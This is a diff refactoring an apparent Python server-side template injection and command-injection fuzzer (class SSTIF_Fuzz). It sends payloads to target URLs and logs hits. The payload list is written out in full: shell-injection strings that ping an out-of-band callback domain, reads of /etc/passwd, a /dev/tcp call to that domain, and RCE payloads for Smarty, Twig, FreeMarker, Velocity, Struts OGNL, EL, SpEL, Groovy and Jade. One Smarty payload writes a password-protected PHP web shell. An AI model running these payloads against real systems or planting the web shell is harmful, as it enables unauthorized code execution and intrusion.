@@ -49,63 +49,75 @@ class SSTIF_Fuzz(threading.Thread):
     # 初始化payloads
     # 出现字符串: 646744516
     def _init_payloads_(self,):
-        payloads_list = []
-        # 通用
-        payloads_list.append("`ping {my_cloudeye}`".replace("{my_cloudeye}",self.my_cloudeye))
-        payloads_list.append("test|ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
-        payloads_list.append("test&&ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
-        payloads_list.append("test;ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
-        payloads_list.append("test%0Aping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
-        payloads_list.append("test%26%26ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
-        payloads_list.append("test%ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye))
-
-        payloads_list.append("`cat</etc/passwd`")
-        payloads_list.append("`cat$IFS/etc/passwd`")
-        payloads_list.append("`cat$IFS/dev/tcp/Found.linuxRCE.{my_cloudeye}/80/`".replace("{my_cloudeye}", self.my_cloudeye))
-        payloads_list.append('''";/bin/cat</etc/passwd;"''')
-        payloads_list.append("10516*61501")
-        payloads_list.append("cat</etc/passwd")
-        payloads_list.append("{{10516*61501}}")
-        payloads_list.append("${10516*61501}")
-        payloads_list.append("#{10516*61501}")
-        payloads_list.append("${@eval%2810516*61501%29}")
-        payloads_list.append('''${@system(ping {my_cloudeye})}'''.replace("{my_cloudeye}", self.my_cloudeye))
-        payloads_list.append("#{ping {my_cloudeye}}".replace("{my_cloudeye}",self.my_cloudeye))
-        payloads_list.append("ping {my_cloudeye}".replace("{my_cloudeye}",self.my_cloudeye))
-        payloads_list.append("$(ping {my_cloudeye})".replace("{my_cloudeye}",self.my_cloudeye))
-        payloads_list.append("${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u002710516*61501\u0027).getInputStream())}")
-        # PHP
-        payloads_list.append("{php}echo 10516*61501;{/php}")
-        payloads_list.append("${${eval(10516*61501)}}")
-        payloads_list.append("$%7B$%7Beval(10516*61501)%7D%7D")
-        payloads_list.append("<?php echo 10516*61501;?>")
-        payloads_list.append("<? echo 10516*61501;?>")
-        payloads_list.append("<SCRIPT LANGUAGE='php'>echo 10516*61501;</SCRIPT>")
-        payloads_list.append("<% echo 10516*61501; %>")
-        payloads_list.append("<% import os x=os.popen('ping {my_cloudeye}').read() %> ${x}".replace("{my_cloudeye}",self.my_cloudeye))
-        payloads_list.append('''{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ping {my_cloudeye}")}}'''.replace("{my_cloudeye}",self.my_cloudeye))
-        # 写入shell:fuzzingRCE.php 密码：wooyun
-        payloads_list.append('''{Smarty_Internal_Write_File::writeFile('fuzzingRCE.php',"<?php passthru($_GET['wooyun']);?>",self::clearConfig())}''')
-        # JAVA
-        payloads_list.append('''$class.inspect("java.lang.Runtime").type.getRuntime().exec("ping {my_cloudeye}").waitFor()'''.replace("{my_cloudeye}",self.my_cloudeye))
-        payloads_list.append('''<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(ping {my_cloudeye}) }'''.replace("{my_cloudeye}",self.my_cloudeye))
-        payloads_list.append('''&('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exec("ping {my_cloudeye}")')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1'''.replace("{my_cloudeye}",self.my_cloudeye))
-        # EL表达式
-        payloads_list.append('''${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping {my_cloudeye}",null).getInputStream())}'''.replace("{my_cloudeye}",self.my_cloudeye))
-        # Spring SPEL表达式POC
-        #
-        payloads_list.append('''${new%20java.lang.String(new%20byte[]{54, 52, 54, 55, 52, 52, 53, 49, 54})}''')
-        # Spring SPEL表达式EXP
-        payloads_list.append('''${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat</etc/passwd').getInputStream())}''')
-        # Groovy
-        payloads_list.append(''' println "ping {my_cloudeye}".execute().text'''.replace("{my_cloudeye}",self.my_cloudeye))
         exp = '''\
 - var x = root.process
 - x = x.mainModule.require
 - x = x('child_process')
 = x.exec('ping {my_cloudeye}')
 '''
-        payloads_list.append(exp.replace("{my_cloudeye}",self.my_cloudeye))
+        payloads_list = [
+            "`ping {my_cloudeye}`".replace("{my_cloudeye}", self.my_cloudeye),
+            "test|ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye),
+            "test&&ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye),
+            "test;ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye),
+            "test%0Aping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye),
+            "test%26%26ping {my_cloudeye}".replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            "test%ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye),
+            "`cat</etc/passwd`",
+            "`cat$IFS/etc/passwd`",
+            "`cat$IFS/dev/tcp/Found.linuxRCE.{my_cloudeye}/80/`".replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            '''";/bin/cat</etc/passwd;"''',
+            "10516*61501",
+            "cat</etc/passwd",
+            "{{10516*61501}}",
+            "${10516*61501}",
+            "#{10516*61501}",
+            "${@eval%2810516*61501%29}",
+            '''${@system(ping {my_cloudeye})}'''.replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            "#{ping {my_cloudeye}}".replace("{my_cloudeye}", self.my_cloudeye),
+            "ping {my_cloudeye}".replace("{my_cloudeye}", self.my_cloudeye),
+            "$(ping {my_cloudeye})".replace("{my_cloudeye}", self.my_cloudeye),
+            "${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u002710516*61501\u0027).getInputStream())}",
+            "{php}echo 10516*61501;{/php}",
+            "${${eval(10516*61501)}}",
+            "$%7B$%7Beval(10516*61501)%7D%7D",
+            "<?php echo 10516*61501;?>",
+            "<? echo 10516*61501;?>",
+            "<SCRIPT LANGUAGE='php'>echo 10516*61501;</SCRIPT>",
+            "<% echo 10516*61501; %>",
+            "<% import os x=os.popen('ping {my_cloudeye}').read() %> ${x}".replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            '''{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ping {my_cloudeye}")}}'''.replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            '''{Smarty_Internal_Write_File::writeFile('fuzzingRCE.php',"<?php passthru($_GET['wooyun']);?>",self::clearConfig())}''',
+            '''$class.inspect("java.lang.Runtime").type.getRuntime().exec("ping {my_cloudeye}").waitFor()'''.replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            '''<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(ping {my_cloudeye}) }'''.replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            '''&('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exec("ping {my_cloudeye}")')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1'''.replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            '''${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ping {my_cloudeye}",null).getInputStream())}'''.replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            '''${new%20java.lang.String(new%20byte[]{54, 52, 54, 55, 52, 52, 53, 49, 54})}''',
+            '''${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat</etc/passwd').getInputStream())}''',
+            ''' println "ping {my_cloudeye}".execute().text'''.replace(
+                "{my_cloudeye}", self.my_cloudeye
+            ),
+            exp.replace("{my_cloudeye}", self.my_cloudeye),
+        ]
+
         # 初始化paylaods
         self.fuzzing_payloads_list = payloads_list
 
@@ -115,14 +127,14 @@ class SSTIF_Fuzz(threading.Thread):
         fuzzing_url = requests_dict['uri']
         headers = requests_dict['headers']
         try:
-            if "GET" == requests_dict['method']:
+            if requests_dict['method'] == "GET":
                 resp = requests.get(fuzzing_url, headers=headers, timeout=10)
                 result = resp.content
                 for key in self.CheckKey_list:
                     if key in result:
                         isVul = True
                         break
-            elif "POST" == requests_dict['method']:
+            elif requests_dict['method'] == "POST":
                 resp = requests.post(fuzzing_url, data=requests_dict['body'], headers=headers, timeout=10)
                 result = resp.content
                 for key in self.CheckKey_list:
@@ -182,8 +194,8 @@ class SSTIF_Fuzz(threading.Thread):
 
     # 记录到文件
     def FileHelper(self, HTTP_Method, Rce_URL, parameter, payload):
-        wfile = open('rce_success_result.txt', mode='a+')
-        found_rce_text = '''\
+        with open('rce_success_result.txt', mode='a+') as wfile:
+            found_rce_text = '''\
 +==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==+
 +=+URL: {RCE_URL}
 +=+method: {HTTP_Method}
@@ -191,11 +203,10 @@ class SSTIF_Fuzz(threading.Thread):
 +=+payload: {payload}
 +==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==++==+
         '''
-        found_rce_text = found_rce_text.replace("{RCE_URL}", Rce_URL).replace("{HTTP_Method}", HTTP_Method).replace("{parameter}", parameter).replace("{payload}", payload)
-        wfile.write(found_rce_text)
-        wfile.write("\r\n")
-        wfile.flush()
-        wfile.close()
+            found_rce_text = found_rce_text.replace("{RCE_URL}", Rce_URL).replace("{HTTP_Method}", HTTP_Method).replace("{parameter}", parameter).replace("{payload}", payload)
+            wfile.write(found_rce_text)
+            wfile.write("\r\n")
+            wfile.flush()
 
     def run(self):
         while True:
@@ -212,7 +223,7 @@ class SSTIF_Fuzz(threading.Thread):
                 pass
 def get_proxy(url):
     url_parsed = urlparse(url, scheme='http')
-    proxy_key = '%s_proxy' % url_parsed.scheme
+    proxy_key = f'{url_parsed.scheme}_proxy'
     return os.environ.get(proxy_key)
 
 def parse_proxy(proxy):
@@ -220,8 +231,7 @@ def parse_proxy(proxy):
     return proxy_parsed.hostname, proxy_parsed.port
 
 def fetch_request(url, callback, **kwargs):
-    proxy = get_proxy(url)
-    if proxy:
+    if proxy := get_proxy(url):
         logger.debug('Forward request via upstream proxy %s', proxy)
         tornado.httpclient.AsyncHTTPClient.configure(
             'tornado.curl_httpclient.CurlAsyncHTTPClient')
